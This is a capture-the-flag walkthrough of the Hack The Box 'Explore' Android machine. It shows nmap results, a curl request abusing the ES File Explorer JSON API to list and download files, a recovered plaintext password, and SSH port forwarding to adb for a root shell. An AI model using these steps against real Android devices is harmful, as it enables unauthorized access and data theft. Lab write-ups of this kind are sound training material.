![EXPLORE](banner.png)

## Initial Foothold

```
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
5555/tcp  filtered freeciv
42135/tcp open     http    ES File Explorer Name Response httpd
43811/tcp open     unknown
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
Service Info: Device: phone
```

So this is an android device running ES File Explorer on port 42135 and something on 59777. Visiting the website on port 59777 it doesn't seem like a bukkit server but running dirbuster gives us some files. These aren't actual webpages but files to download. With the hint of a JSON api and the ES File Explorer running we found a vulnerability to execute commands through the service of that ES File Explorer like:
```
curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://explore.htb:59777
```
You can even use other commands like "listApps". But this listFiles is just enough because it gives us a file structure where we can search through.

## User:

And finally we found something at:
```
http://explore.htb:59777/sdcard/DCIM/creds.jpg
```
This is a picture that gives us credentials:
```
kristi:Kr1sT!5h@Rp3xPl0r3!
```
Now we can connect via ssh.
There we are an android user and linpeas tells us we are already root but that's a false positive maybe because we are inside the app or something like that.

## Root:

In the nmap scan from the beginning we already found the open port at 5555. This is actually running the Android debug bridge (adb).
As this adb is only accessable locally we need to forward the port like:
```
ssh kristi@explore.htb -L 5555:127.0.0.1:5555 -p 2222
```
Now we can connect the adb on our local machine:
```
adb connect 127.0.0.1:5555
```

With:
```
adb shell
su root
```
or just by:
```
adb root
```
you get the root shell on that device and can find the flag in /data.
